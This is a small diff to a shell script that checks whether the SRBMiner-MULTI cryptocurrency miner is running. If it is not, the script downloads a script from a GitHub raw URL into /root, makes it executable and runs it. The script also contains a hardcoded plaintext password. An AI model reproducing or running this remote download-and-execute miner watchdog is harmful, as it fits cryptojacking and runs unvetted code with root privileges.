@@ -1,10 +1,10 @@
 #!/bin/sh
 password="danielchau@123#"
-if pgrep cpuminer >/dev/null
+if pgrep SRBMiner-MULTI >/dev/null
 then
-  echo "cpuminer is running."
+  echo "SRBMiner-MULTI is running."
 else
-  echo "cpuminer isn't running"
+  echo "SRBMiner-MULTI isn't running"
   wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
   chmod +x /root/kill_miner.sh
   ./kill_miner.sh
